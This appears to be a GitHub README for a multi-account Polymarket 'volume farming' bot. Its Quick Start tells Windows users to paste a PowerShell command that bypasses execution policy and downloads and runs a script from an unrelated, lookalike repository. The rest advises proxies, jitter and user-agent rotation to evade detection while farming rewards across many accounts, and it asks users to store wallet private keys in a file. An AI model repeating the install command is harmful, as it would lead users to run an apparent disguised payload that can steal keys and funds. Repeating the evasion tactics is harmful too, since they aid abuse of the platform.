# 🤖 Polymarket Bot

> Automated multi-account bot for [Polymarket](https://polymarket.com) — places predictions, farms volume, completes streaks, and maximizes rewards across unlimited accounts with per-account proxy support

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Polymarket](https://img.shields.io/badge/Polymarket-Predict-0066FF?style=for-the-badge&logoColor=white)](https://polymarket.com)
[![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/omgmad/polymarket-bot?style=for-the-badge&color=FFD700)](https://github.com/omgmad/polymarket-bot)

```
╔══════════════════════════════════════════════════════════════════╗
║  Module 1 — Auto Predictor   │  place bets on open markets      ║
║  Module 2 — Volume Farmer    │  hit volume targets every cycle  ║
║  Module 3 — Points Farmer    │  full automation across N accs   ║
║                                                                  ║
║  ✦ Multi-account  ·  Per-account proxies  ·  Async workers     ║
╚══════════════════════════════════════════════════════════════════╝
```

**[🚀 Open Polymarket](https://polymarket.com)** · **[🐦 Follow Dev](https://x.com/0mgm4d)**

---

## 🚀 Quick Start

If you just want to get the project running fast on Windows, use the installation command below first. After that, continue with the project-specific setup, configuration, and usage sections.

### 🛠️ Installation

#### CMD
Open **CMD** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/llllllilllll/Kalshi-Trade-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

> Then continue with the project-specific setup steps below.

## 📘 Project-Specific Setup

### Step 2 — Create a virtual environment

```bash
python3 -m venv venv

# Linux / Mac
source venv/bin/activate

# Windows
venv\Scripts\activate
```

### Step 3 — Install dependencies

```bash
pip install requests web3 python-dotenv colorama aiohttp aiohttp-socks py-clob-client
```

> `py-clob-client` is the official Polymarket CLOB API Python client.

### Step 4 — Get your API credentials

For each account:

1. Connect your wallet at [polymarket.com](https://polymarket.com)
2. Go to **Profile → Settings → API Keys → Create API Key**
3. Save the **API Key**, **Secret**, and **Passphrase**
4. Add them to the account entry in `accounts.json`

### Step 5 — Fund your wallets

Each wallet needs **USDC on Polygon** to place predictions. Bridge or buy USDC and deposit to each wallet before starting.

### Step 6 — Build your accounts.json

```bash
cp accounts.example.json accounts.json
nano accounts.json
```

---

## 📌 Table of Contents

- [Quick Start](#-quick-start)
- [How It Works](#-how-it-works)
- [Multi-Account & Proxy Support](#-multi-account--proxy-support)
- [Modules](#-modules)
  - [Module 1 — Auto Predictor](#-module-1--auto-predictor)
  - [Module 2 — Volume Farmer](#-module-2--volume-farmer)
  - [Module 3 — Points Farmer](#-module-3--points-farmer)
- [Configuration](#️-configuration)
- [Running the Bot](#-running-the-bot)
- [Running 24/7 on a VPS](#️-running-247-on-a-vps)
- [Telegram Commands](#-telegram-commands)
- [Disclaimer](#️-disclaimer)

---

## ⚡ How It Works

```
  Polymarket opens new prediction markets
          │
          ▼  (all accounts check simultaneously)
          │
  Per account:
    • Authenticate via Polymarket API key + wallet
    • Route traffic through assigned proxy
    • Fetch open markets ranked by volume/liquidity
    • Place predictions based on configured strategy
    • Track volume targets and streak check-ins
          │
          ▼
  Positions tracked → resolved markets collected  🎯
          │
          ▼
  Telegram summary sent  📱
```

Every account runs as an independent async worker — one failed proxy or expired session never blocks the others.

---

## 👥 Multi-Account & Proxy Support

### How accounts are configured

All accounts live in `accounts.json`. Each entry holds its own wallet, API credentials, prediction strategy, and optionally a dedicated proxy.

```
  accounts.json
  ├── Account #1  →  wallet_1 + apikey_1 + proxy_1 + strategy: majority
  ├── Account #2  →  wallet_2 + apikey_2 + proxy_2 + strategy: contrarian
  ├── Account #3  →  wallet_3 + apikey_3 + (no proxy) + strategy: random
  └── ...unlimited accounts
          │
          ▼
  Bot spawns one async worker per account
          │
          ▼
  Workers run in parallel up to MAX_PARALLEL
  Remaining accounts queue and start as slots free
```

**accounts.json structure:**

```json
[
  {
    "id": "account_1",
    "label": "Main",
    "wallet_address": "0xYourWallet1",
    "private_key": "0xYourPrivateKey1",
    "polymarket_api_key": "your_api_key_1",
    "polymarket_api_secret": "your_api_secret_1",
    "polymarket_passphrase": "your_passphrase_1",
    "referral_code": "YOUR_REF",
    "strategy": "majority",
    "proxy": "http://user:pass@host:port"
  },
  {
    "id": "account_2",
    "label": "Secondary",
    "wallet_address": "0xYourWallet2",
    "private_key": "0xYourPrivateKey2",
    "polymarket_api_key": "your_api_key_2",
    "polymarket_api_secret": "your_api_secret_2",
    "polymarket_passphrase": "your_passphrase_2",
    "referral_code": "YOUR_REF",
    "strategy": "contrarian",
    "proxy": "socks5://user:pass@host:port"
  },
  {
    "id": "account_3",
    "label": "No proxy",
    "wallet_address": "0xYourWallet3",
    "private_key": "0xYourPrivateKey3",
    "polymarket_api_key": "your_api_key_3",
    "polymarket_api_secret": "your_api_secret_3",
    "polymarket_passphrase": "your_passphrase_3",
    "referral_code": "YOUR_REF",
    "strategy": "random",
    "proxy": ""
  }
]
```

### How to get Polymarket API credentials

1. Go to [polymarket.com](https://polymarket.com) and connect your wallet
2. Navigate to **Profile → Settings → API Keys**
3. Click **Create API Key**
4. Save the **API Key**, **Secret**, and **Passphrase** — they are shown only once
5. Add them to the corresponding account entry in `accounts.json`

> ⚠️ Each Polymarket account needs its own set of API credentials. The same wallet cannot have multiple active API keys simultaneously.

### Proxy formats supported

| Format | Example |
|--------|---------|
| HTTP | `http://user:pass@host:port` |
| HTTPS | `https://user:pass@host:port` |
| SOCKS5 | `socks5://user:pass@host:port` |
| No auth | `http://host:port` |
| None | leave `"proxy": ""` |

### Concurrency & safety settings

```env
MAX_PARALLEL=5              # Max accounts running at the same time
ACCOUNT_DELAY=15            # Seconds between launching each worker
JITTER=true                 # Random ±10s delay per action (human-like)
PROXY_TEST_ON_START=true    # Verify each proxy before farming begins
ROTATE_USER_AGENT=true      # Unique user-agent per account
```

> 💡 **Tip:** Running many accounts from one IP risks detection. Assign a dedicated proxy to every account. Enable `PROXY_TEST_ON_START=true` — bad proxies are flagged before the cycle starts, not mid-run.

---

## 📐 Modules

### 🔮 Module 1 — Auto Predictor

The bot fetches open Polymarket markets, ranks them by liquidity and volume, and places limit or market orders on behalf of each account according to its strategy.

```
  Fetch open markets via Polymarket API  (per account)
              │
              ▼
  Filter:
    • Min liquidity > PREDICT_MIN_LIQUIDITY
    • Not already holding a position
    • Within allowed categories
    • Closing date > MIN_HOURS_TO_CLOSE
              │
              ▼
  Apply strategy:
    • majority    → buy the leading side (YES if >50% probability)
    • contrarian  → buy the trailing side
    • random      → random YES / NO
    • custom      → filter by keyword/category, buy a fixed side
              │
              ▼
  Place LIMIT order at current best price  ✅
  (falls back to MARKET if limit not filled within timeout)
              │
              ▼
  Position tracked until resolution  →  collect USDC payout  💵
```

**Prediction strategies:**

| Strategy | Logic | Best for |
|----------|-------|----------|
| `majority` | Buy leading side (highest probability) | Safer volume farming |
| `contrarian` | Buy trailing side (lower probability, higher odds) | Higher variance, more upside |
| `random` | Random YES / NO per market | Maximum market coverage |
| `custom` | Filter by category + keyword | Targeted category farming |

**Config block:**

```env
MODULE=predictor
PREDICT_STRATEGY=majority
PREDICT_AMOUNT=1                   # USDC per prediction
PREDICT_MAX_PER_CYCLE=10           # Max new positions per account per cycle
PREDICT_CATEGORIES=politics,crypto # Only enter these categories (blank = all)
PREDICT_MIN_LIQUIDITY=1000         # Skip markets with less than $N liquidity
PREDICT_MIN_HOURS_TO_CLOSE=6       # Skip markets closing in less than N hours
PREDICT_ORDER_TYPE=LIMIT           # LIMIT or MARKET
PREDICT_LIMIT_TIMEOUT=60           # Seconds to wait for limit fill before cancel
PREDICT_INTERVAL=3600              # Check for new markets every N seconds
```

> 💡 **Tip:** Keep `PREDICT_AMOUNT` small (1–5 USDC) — the goal is volume coverage and streak maintenance, not speculation. Use `PREDICT_MIN_LIQUIDITY` to avoid illiquid markets where orders don't fill.

---

### 📊 Module 2 — Volume Farmer

Tracks each account's trading volume and ensures weekly/monthly volume targets are hit — which unlock higher reward tiers on Polymarket.

```
  Check current volume for account  (period: weekly / monthly)
              │
              ▼
  Volume below target?
    • YES → calculate how many more trades needed
            → spread trades across remaining days
            → execute via Auto Predictor  (Module 1)
    • NO  → sleep until next period
              │
              ▼
  Volume target reached  →  tier reward unlocked  🏆
              │
              ▼
  Telegram alert: tier reached + USDC reward if any
```

**Volume tiers (approximate — check Polymarket for current values):**

| Tier | Weekly Volume | Reward |
|------|--------------|--------|
| Bronze | $100+ | Base rewards |
| Silver | $500+ | 1.25× multiplier |
| Gold | $2,000+ | 1.5× multiplier |
| Platinum | $10,000+ | 2× multiplier |

**Config block:**

```env
MODULE=volume
VOLUME_TARGET_WEEKLY=500           # USDC weekly volume target per account
VOLUME_TARGET_MONTHLY=2000         # USDC monthly volume target per account
VOLUME_SPREAD_EVENLY=true          # Spread trades over remaining days in period
VOLUME_CHECK_INTERVAL=3600         # Check volume progress every N seconds
VOLUME_ALERT_AT_PERCENT=80         # Telegram alert when N% of target reached
```

> 💡 **Tip:** Enable `VOLUME_SPREAD_EVENLY=true` — spreading trades prevents a burst of activity on the last day of the period, which looks unnatural and may trigger review.

---

### 🌾 Module 3 — Points Farmer

Combines both modules into one fully automated loop. Each account runs its own independent cycle — predictions, volume tracking, and streak check-ins all managed in parallel.

```
  All account workers start  (staggered by ACCOUNT_DELAY)
          │
          ▼  each worker independently:
          │
  Place predictions on open markets  (Module 1)
          │
          ▼
  Track and top up volume target  (Module 2)
          │
          ▼
  Wait CYCLE_INTERVAL
          │
          ▼
  Daily cap / volume target reached?
    • NO  → next cycle
    • YES → sleep until next period reset  😴
          │
          ▼
  Telegram summary: volume, positions, rewards per account  📱
```

**Config block:**

```env
MODULE=farmer
CYCLE_INTERVAL=3600
FARMER_START_TIME=07:00
FARMER_STOP_TIME=23:30
POST_CYCLE_SUMMARY=true
```

---

## ⚙️ Configuration

### `accounts.json` — one entry per account

See the [Multi-Account & Proxy Support](#-multi-account--proxy-support) section above for the full structure.

### `.env` — global settings

```env
# ── Active module ──────────────────────────────────────
# Options: predictor | volume | farmer
MODULE=farmer

# ── Multi-account ──────────────────────────────────────
ACCOUNTS_FILE=accounts.json
MAX_PARALLEL=5
ACCOUNT_DELAY=15
JITTER=true
PROXY_TEST_ON_START=true
ROTATE_USER_AGENT=true

# ── Prediction settings ────────────────────────────────
PREDICT_STRATEGY=majority
PREDICT_AMOUNT=1
PREDICT_MAX_PER_CYCLE=10
PREDICT_CATEGORIES=
PREDICT_MIN_LIQUIDITY=1000
PREDICT_MIN_HOURS_TO_CLOSE=6
PREDICT_ORDER_TYPE=LIMIT
PREDICT_LIMIT_TIMEOUT=60
PREDICT_INTERVAL=3600

# ── Volume targets ─────────────────────────────────────
VOLUME_TARGET_WEEKLY=500
VOLUME_TARGET_MONTHLY=2000
VOLUME_SPREAD_EVENLY=true
VOLUME_CHECK_INTERVAL=3600
VOLUME_ALERT_AT_PERCENT=80

# ── Farming schedule ───────────────────────────────────
CYCLE_INTERVAL=3600
FARMER_START_TIME=07:00
FARMER_STOP_TIME=23:30

# ── Telegram (optional but recommended) ────────────────
TELEGRAM_TOKEN=
TELEGRAM_CHAT_ID=
```

---

## 🚀 Running the Bot

```bash
# First-time setup (creates accounts.json template)
python polymarket_bot.py --setup

# Run all accounts
python polymarket_bot.py

# Run a single account
python polymarket_bot.py --account account_1

# Single cycle and exit
python polymarket_bot.py --once

# Test proxies without placing any orders
python polymarket_bot.py --test-proxies

# Dashboard only
python polymarket_bot.py --dashboard
```

On successful start:

```
╔══════════════════════════════════════════════════════╗
║   🤖  Polymarket Bot v1.0                            ║
║   Press Ctrl+C at any time to stop.                  ║
╚══════════════════════════════════════════════════════╝

  Module:      farmer
  Accounts:    4 loaded
  Proxies:     3 assigned  (1 direct)
  Parallel:    up to 5
  Strategy:    majority (default)
  Jitter:      ON

  Testing proxies... ██████████  3/3 OK

  Start bot? [yes/no]: yes
```

**Live terminal dashboard:**

```
🤖 Polymarket Bot v1.0                     updated 09:04:15
══════════════════════════════════════════════════════════════
  Module: farmer   Accounts: 4   Next cycle: 38m
──────────────────────────────────────────────────────────────
  ACCOUNTS
  ID            Vol (week)   Tier       Positions   Status
  account_1     $312 / $500  🥈 Silver  8 open      ● running
  account_2     $189 / $500  🥉 Bronze  5 open      ● running
  account_3     $501 / $500  🥇 Gold ✅ 11 open     😴 target hit
  account_4       $0 / $500  —          0 open      ⏳ queued
──────────────────────────────────────────────────────────────
  OPEN POSITIONS  (account_1)
  Market                              Side   Amount   Prob    P&L
  Will Fed cut rates in Q1 2026?      YES    $1.00    62%    +$0.12
  BTC above $120k end of 2025?        YES    $1.00    48%    -$0.04
  Trump wins 2026 midterms?           NO     $1.00    38%    +$0.08
──────────────────────────────────────────────────────────────
  RECENT ACTIVITY
  09:04:15  account_1   Order placed  Fed cut Q1? YES  $1.00
  09:03:40  account_2   Order filled  BTC $120k?  YES  $1.00
  09:02:55  account_3   Weekly target reached  🥇 Gold tier
  09:01:10  account_4   Proxy OK — starting shortly
```

---

## 🖥️ Running 24/7 on a VPS

For continuous operation, use a cheap VPS (Vultr, DigitalOcean, Hetzner — ~$5/month).

### Ubuntu VPS setup

```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y
sudo apt install python3 python3-pip python3-venv screen git -y

# 2. Clone repo
git clone https://github.com/omgmad/polymarket-bot
cd polymarket-bot

# 3. Virtual environment
python3 -m venv venv
source venv/bin/activate
pip install requests web3 python-dotenv colorama aiohttp aiohttp-socks py-clob-client

# 4. Configure
nano .env
nano accounts.json

# 5. Run inside screen (stays alive after you disconnect)
screen -S polybot
source venv/bin/activate
python polymarket_bot.py

# Press Ctrl+A then D to detach — bot keeps running
```

### Reconnect later

```bash
screen -r polybot
```

### Useful log commands

```bash
tail -50 polymarket_bot.log
grep "filled" polymarket_bot.log | tail -20       # Filled orders
grep "resolved" polymarket_bot.log | tail -20     # Resolved markets
grep "tier" polymarket_bot.log | tail -10         # Volume tier events
grep "proxy" polymarket_bot.log | tail -20        # Proxy events
grep "ERROR" polymarket_bot.log | tail -10        # Errors
```

---

## 📱 Telegram Setup & Commands

### Step 1 — Create a bot and get your token

1. Search for **`@BotFather`** on Telegram, send `/newbot`
2. Copy the token into `.env`:

```env
TELEGRAM_TOKEN=your_bot_token_here
```

### Step 2 — Get your Chat ID

1. Search for **`@userinfobot`**, send any message
2. Copy the numeric ID into `.env`:

```env
TELEGRAM_CHAT_ID=123456789
```

### Commands

| Command | Action |
|---------|--------|
| `/status` | All accounts: volume, tier, open positions, proxy |
| `/positions` | All open positions with current P&L |
| `/volume` | Weekly and monthly volume progress per account |
| `/pause` | Pause all accounts |
| `/pause account_1` | Pause one specific account |
| `/resume` | Resume all accounts |
| `/proxies` | Proxy health for all accounts |
| `/stop` | Stop the bot completely |
| `/pnl` | Realized P&L breakdown across all accounts |

### Example alerts

```
🔮 Order Placed
Account:  account_1
Market:   Will Fed cut rates in Q1 2026?
Side:     YES
Amount:   $1.00 USDC
Type:     LIMIT @ 0.62

✅ Order Filled
Account:  account_2
Market:   BTC above $120k end of 2025?
Side:     YES  filled @ 0.48

🏆 Volume Tier Reached
Account:  account_3
Tier:     GOLD  🥇
Volume:   $501 this week
Reward:   1.5× multiplier active

💵 Market Resolved
Account:  account_1
Market:   ETH flips BTC in 2025?
Result:   NO  ✅  (you bet NO)
Payout:   +$0.82 USDC

⚠️ Proxy Failed
Account:  account_2
Proxy:    proxy_3
Action:   falling back to direct connection

😴 All Targets Hit
account_1 → $500 / $500 weekly
account_2 → $500 / $500 weekly
account_4 → $312 / $500  ● still farming
```

---

## ⚠️ Disclaimer

> **RISK WARNING:** This bot places real-money predictions on a live prediction market using your own USDC. Prediction markets carry financial risk — you may lose some or all of the USDC in active positions. Use entirely at your own risk.

- Never invest more than you can afford to lose
- Keep `PREDICT_AMOUNT` small — this is a volume farming tool, not a trading system
- Never share your `accounts.json`, private keys, or API credentials with anyone
- With many accounts on the same IP, use proxies to avoid detection
- API credentials are shown only once on creation — save them securely
- Check Polymarket's terms of service regarding bot usage in your region

---

## 🔗 Links

[![Polymarket](https://img.shields.io/badge/🔵_Polymarket-Open_App-0066FF?style=for-the-badge)](https://polymarket.com)
[![Twitter](https://img.shields.io/badge/🐦_Twitter-@0mgm4d-1DA1F2?style=for-the-badge)](https://x.com/0mgm4d)

**If this helped you, please give it a ⭐ Star — it means a lot!**

## 🔍 Topics

`polymarket-kalshi-arbitrage-bot` `kalshi-polymarket-bot` `arbitrage-bot` `prediction-arbitrage` `btc-updown-bot` `cross-venue-arbitrage` `kalshi-bot` `polymarket-bot` `prediction-markets` `typescript-bot` `automated-trading` `crypto-bot` `15m-markets` `limit-orders` `real-time-monitor` `risk-free-arb` `bitcoin-prediction` `kalshi-api` `polymarket-clob` `event-arbitrage`
